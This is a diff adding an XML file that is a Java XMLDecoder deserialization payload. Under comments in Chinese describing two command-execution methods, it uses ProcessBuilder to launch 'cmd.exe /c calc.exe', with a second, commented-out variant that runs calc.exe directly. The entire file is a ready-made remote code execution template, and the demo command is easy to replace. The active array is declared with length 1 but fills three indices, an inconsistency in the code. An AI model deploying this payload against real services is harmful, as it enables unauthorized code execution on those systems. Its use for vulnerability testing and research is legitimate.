@@ -1,0 +1,37 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!--   start执行命令方式1-->
+<!-- new ProcessBuilder("cmd.exe", "/c", "calc.exe").start();-->
+<java version="1.8.0_181" class="java.beans.XMLDecoder">
+    <object class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="1">
+            <void index="0">
+                <string>cmd.exe</string>
+            </void>
+            <void index="1">
+                <string>/c</string>
+            </void>
+            <void index="2">
+                <string>calc.exe</string>
+            </void>
+        </array>
+        <void method="start" />
+    </object>
+</java>
+
+
+
+
+<!--    start执行命令方式2-->
+<!--  new ProcessBuilder("calc.exe").start();-->
+
+<!--<java version="1.8.0_181" class="java.beans.XMLDecoder">-->
+<!--    <object class="java.lang.ProcessBuilder">-->
+<!--        <array class="java.lang.String" length="1">-->
+<!--            <void index="0">-->
+<!--                <string>calc.exe</string>-->
+<!--            </void>-->
+<!--        </array>-->
+<!--        <void method="start" />-->
+<!--    </object>-->
+<!--</java>-->
